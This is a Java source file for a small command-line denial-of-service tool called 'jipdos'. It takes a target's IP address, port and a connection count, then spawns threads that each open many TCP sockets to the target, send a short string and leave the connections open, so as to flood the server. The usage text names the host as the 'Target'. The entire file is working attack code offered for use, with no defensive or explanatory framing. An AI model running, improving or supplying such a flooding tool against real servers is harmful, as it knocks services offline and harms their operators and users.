import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.io.DataOutputStream;
import java.io.IOException;


class Mainsoc implements Runnable{
    public String ip;
    public int port;
    public int connection;
    

    public void run(){
        for (int x=0; x< connection; x++){
            try {
                Socket soc = new Socket(ip, port);
                DataOutputStream out = new DataOutputStream(soc.getOutputStream());
                out.writeUTF("EH");
                out.flush();

            }catch(java.net.ConnectException e){
                System.out.println("\u001B[34m [+]Connection Error: Server Might Be Down \u001B[0m");
            }catch(java.net.SocketException e){
                System.out.println("\u001B[34m Error From Socket \u001B[0m");
            }catch (UnknownHostException e){
                System.out.println("\u001B{34 [-]Unknown Host Error \u001B[0m");
            }catch (IOException e) {
                System.out.println(e);
            }
        }    
    }
}

public class jipdos{
    public static String osplatform = System.getProperty("os.name").toLowerCase();

    public static void clearSystem(){
        try {
            if (osWindows()){
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            }else if (osLinux()){
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }else if (osMac()){
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        }catch(InterruptedException e){
            e.getStackTrace();
        } 
        catch (IOException e) {
            e.getStackTrace();
        }
    }
    
    public static void main(String[] args) {
        clearSystem();

        try {
            
            for (int x=0; x< Integer.parseInt(args[2]); x++){
                Mainsoc socs = new Mainsoc();
                socs.ip = args[0];
                socs.port = Integer.parseInt(args[1]);
                socs.connection = Integer.parseInt(args[2]);
                Thread th = new Thread(socs);
                th.start();
            }
        } catch (java.lang.ArrayIndexOutOfBoundsException e) {
            System.out.println("\u001B[34m Usage: java jipdos [You're Target's IP] [You're Target's Port] [Number Of connections] \u001B[0m");
        }

    }

    public static boolean osWindows(){return osplatform.contains("windows")| osplatform.contains("win");}
    public static boolean osLinux(){return osplatform.contains("linux")| osplatform.contains("unix");}
    public static boolean osMac(){return osplatform.contains("mac");}
}